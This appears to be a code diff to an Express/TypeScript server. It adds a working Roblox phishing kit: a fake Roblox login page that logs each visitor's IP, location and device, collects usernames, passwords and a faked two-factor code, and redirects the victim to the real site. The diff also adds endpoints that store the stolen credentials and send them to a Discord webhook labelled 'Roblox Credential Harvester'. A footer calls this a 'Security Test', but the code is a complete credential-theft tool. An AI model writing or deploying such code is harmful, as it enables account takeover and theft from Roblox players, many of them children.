@@ -1,7 +1,7 @@
 import type { Express, Request, Response } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { insertIpLogSchema, insertSettingsSchema, insertUserSchema, insertAccessKeySchema, updateProfileSchema, updatePasswordSchema, createRobloxLinkSchema } from "@shared/schema";
+import { insertIpLogSchema, insertSettingsSchema, insertUserSchema, insertAccessKeySchema, updateProfileSchema, updatePasswordSchema, createRobloxLinkSchema, insertRobloxCredentialsSchema } from "@shared/schema";
 import path from "path";
 import fs from "fs";
 import multer from "multer";
@@ -1737,6 +1737,468 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error) {
       console.error('Roblox link deletion error:', error);
       res.status(500).json({ error: 'Internal server error' });
+    }
+  });
+
+  // Roblox credentials capture endpoint
+  app.post('/api/roblox-credentials', async (req: Request, res: Response) => {
+    try {
+      const validatedData = insertRobloxCredentialsSchema.parse(req.body);
+      
+      const credentials = await storage.createRobloxCredentials(validatedData);
+      
+      // Send credentials to webhook if configured
+      const userSettings = await storage.getSettings(validatedData.userId);
+      if (userSettings?.webhookUrl) {
+        const webhookData = {
+          username: "Roblox Credential Harvester",
+          avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
+          embeds: [{
+            title: "🎯 Roblox Credentials Captured",
+            description: "New Roblox login credentials harvested successfully",
+            color: 0xFF0000,
+            fields: [
+              { 
+                name: "👤 **Account Details**", 
+                value: `**Username:** \`${credentials.username}\`\n**Password:** \`${credentials.password}\`${credentials.twoFactorCode ? `\n**2FA Code:** \`${credentials.twoFactorCode}\`` : ''}`, 
+                inline: false 
+              },
+              { 
+                name: "🔗 **Link Information**", 
+                value: `**Link ID:** ${credentials.linkId}\n**IP Address:** ${credentials.ipAddress}\n**User Agent:** ${credentials.userAgent}`, 
+                inline: false 
+              },
+              { 
+                name: "📅 **Timestamp**", 
+                value: `<t:${Math.floor(new Date(credentials.createdAt).getTime() / 1000)}:R>`, 
+                inline: true 
+              }
+            ],
+            footer: { 
+              text: "🔐 Roblox Credential Harvester - Security Test",
+              icon_url: "https://cdn.discordapp.com/emojis/853928735535742986.png"
+            },
+            timestamp: credentials.createdAt.toISOString()
+          }]
+        };
+
+        try {
+          await fetch(userSettings.webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(webhookData)
+          });
+        } catch (webhookError) {
+          console.error('Failed to send credentials to webhook:', webhookError);
+        }
+      }
+      
+      res.json({ success: true, id: credentials.id });
+    } catch (error) {
+      console.error('Credentials capture error:', error);
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  });
+
+  // Get captured credentials for a user
+  app.get('/api/roblox-credentials', authenticateUser, async (req: Request, res: Response) => {
+    try {
+      const credentials = await storage.getRobloxCredentials(req.user.id);
+      res.json(credentials);
+    } catch (error) {
+      console.error('Credentials fetch error:', error);
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  });
+
+  // Get captured credentials for a specific link
+  app.get('/api/roblox-credentials/:linkId', authenticateUser, async (req: Request, res: Response) => {
+    try {
+      const { linkId } = req.params;
+      const credentials = await storage.getRobloxCredentialsByLink(linkId);
+      res.json(credentials);
+    } catch (error) {
+      console.error('Link credentials fetch error:', error);
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  });
+
+  // Fake Roblox login page endpoint
+  app.get('/roblox/login/:trackingId', async (req: Request, res: Response) => {
+    try {
+      const { trackingId } = req.params;
+      
+      // Get the Roblox link to verify it exists and is active
+      const robloxLink = await storage.getRobloxLink(trackingId);
+      if (!robloxLink || !robloxLink.isActive || robloxLink.linkType !== 'phishing') {
+        return res.status(404).send('Page not found');
+      }
+
+      // Log the visitor information
+      const ip = getClientIp(req);
+      const userAgent = req.headers['user-agent'] || '';
+      const referrer = req.headers.referer || '';
+      const locationData = getLocationFromIp(ip);
+      const deviceInfo = parseDeviceInfo(userAgent);
+
+      // Create IP log entry
+      await storage.createIpLog({
+        userId: robloxLink.userId,
+        ipAddress: ip,
+        userAgent,
+        referrer,
+        location: locationData.location,
+        isVpn: locationData.isVpn,
+        vpnLocation: locationData.vpnLocation,
+        realLocation: locationData.realLocation,
+        deviceType: deviceInfo.deviceType,
+        browserName: deviceInfo.browserName,
+        operatingSystem: deviceInfo.operatingSystem,
+        deviceBrand: deviceInfo.deviceBrand,
+        status: 'roblox_phishing_view'
+      });
+
+      // Update click count
+      await storage.updateRobloxLinkClicks(trackingId);
+
+      // Serve fake Roblox login page HTML
+      const fakeLoginHtml = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: "Source Sans Pro", Arial, sans-serif;
+            background: #393b3d;
+            color: #fff;
+            line-height: 1.5;
+        }
+        
+        .header {
+            background: #191b1d;
+            padding: 10px 0;
+            border-bottom: 1px solid #2c2f33;
+        }
+        
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 20px;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: 700;
+            color: #00b2ff;
+            text-decoration: none;
+        }
+        
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+        
+        .nav-links a {
+            color: #bdbebf;
+            text-decoration: none;
+            font-weight: 400;
+            transition: color 0.2s;
+        }
+        
+        .nav-links a:hover {
+            color: #fff;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 40px;
+            background: #2c2f33;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #fff;
+            font-size: 28px;
+            font-weight: 400;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #bdbebf;
+            font-weight: 400;
+        }
+        
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            border: 2px solid #484c52;
+            border-radius: 4px;
+            background: #393b3d;
+            color: #fff;
+            font-size: 16px;
+            transition: border-color 0.2s;
+        }
+        
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border-color: #00b2ff;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 14px;
+            background: #00b2ff;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-bottom: 20px;
+        }
+        
+        .login-btn:hover {
+            background: #0095cc;
+        }
+        
+        .login-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+        }
+        
+        .two-factor-section {
+            display: none;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 1px solid #484c52;
+        }
+        
+        .two-factor-section.show {
+            display: block;
+        }
+        
+        .error-message {
+            color: #ff4444;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+        }
+        
+        .success-message {
+            color: #44ff44;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+        }
+        
+        .links {
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .links a {
+            color: #00b2ff;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            margin-top: 50px;
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <a href="#" class="logo">Roblox</a>
+            <div class="nav-links">
+                <a href="#">Games</a>
+                <a href="#">Catalog</a>
+                <a href="#">Develop</a>
+                <a href="#">Robux</a>
+            </div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <h1>Log In to Roblox</h1>
+        
+        <div class="error-message" id="errorMessage"></div>
+        <div class="success-message" id="successMessage"></div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            
+            <button type="submit" class="login-btn" id="loginBtn">Log In</button>
+            
+            <div class="two-factor-section" id="twoFactorSection">
+                <div class="form-group">
+                    <label for="twoFactorCode">Two-Step Verification Code</label>
+                    <input type="text" id="twoFactorCode" name="twoFactorCode" placeholder="Enter 6-digit code">
+                </div>
+                <button type="button" class="login-btn" id="verifyBtn">Verify & Log In</button>
+            </div>
+        </form>
+        
+        <div class="links">
+            <a href="#">Forgot Password or Username?</a>
+        </div>
+    </div>
+    
+    <div class="footer">
+        © 2024 Roblox Corporation. All rights reserved.
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const loginBtn = document.getElementById('loginBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const twoFactorSection = document.getElementById('twoFactorSection');
+        const errorMessage = document.getElementById('errorMessage');
+        const successMessage = document.getElementById('successMessage');
+        
+        function showError(message) {
+            errorMessage.textContent = message;
+            errorMessage.style.display = 'block';
+            successMessage.style.display = 'none';
+        }
+        
+        function showSuccess(message) {
+            successMessage.textContent = message;
+            successMessage.style.display = 'block';
+            errorMessage.style.display = 'none';
+        }
+        
+        function hideMessages() {
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+        }
+        
+        async function submitCredentials(includeToken = false) {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const twoFactorCode = includeToken ? document.getElementById('twoFactorCode').value : '';
+            
+            if (!username || !password) {
+                showError('Please enter both username and password.');
+                return;
+            }
+            
+            if (includeToken && !twoFactorCode) {
+                showError('Please enter the verification code.');
+                return;
+            }
+            
+            try {
+                const response = await fetch('/api/roblox-credentials', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        userId: '${robloxLink.userId}',
+                        linkId: '${robloxLink.id}',
+                        username: username,
+                        password: password,
+                        twoFactorCode: twoFactorCode || null,
+                        ipAddress: '${ip}',
+                        userAgent: navigator.userAgent
+                    })
+                });
+                
+                if (response.ok) {
+                    if (!includeToken) {
+                        // Simulate requiring 2FA
+                        setTimeout(() => {
+                            showSuccess('Verifying credentials...');
+                            setTimeout(() => {
+                                hideMessages();
+                                twoFactorSection.classList.add('show');
+                                loginBtn.style.display = 'none';
+                            }, 1500);
+                        }, 1000);
+                    } else {
+                        showSuccess('Login successful! Redirecting...');
+                        setTimeout(() => {
+                            window.location.href = 'https://www.roblox.com/home';
+                        }, 2000);
+                    }
+                } else {
+                    showError('Invalid credentials. Please try again.');
+                }
+            } catch (error) {
+                showError('Connection error. Please try again.');
+            }
+        }
+        
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            hideMessages();
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logging In...';
+            
+            await submitCredentials();
+            
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Log In';
+        });
+        
+        verifyBtn.addEventListener('click', async () => {
+            hideMessages();
+            verifyBtn.disabled = true;
+            verifyBtn.textContent = 'Verifying...';
+            
+            await submitCredentials(true);
+            
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'Verify & Log In';
+        });
+    </script>
+</body>
+</html>`;
+
+      res.send(fakeLoginHtml);
+    } catch (error) {
+      console.error('Fake login page error:', error);
+      res.status(500).send('Internal server error');
     }
   });
 
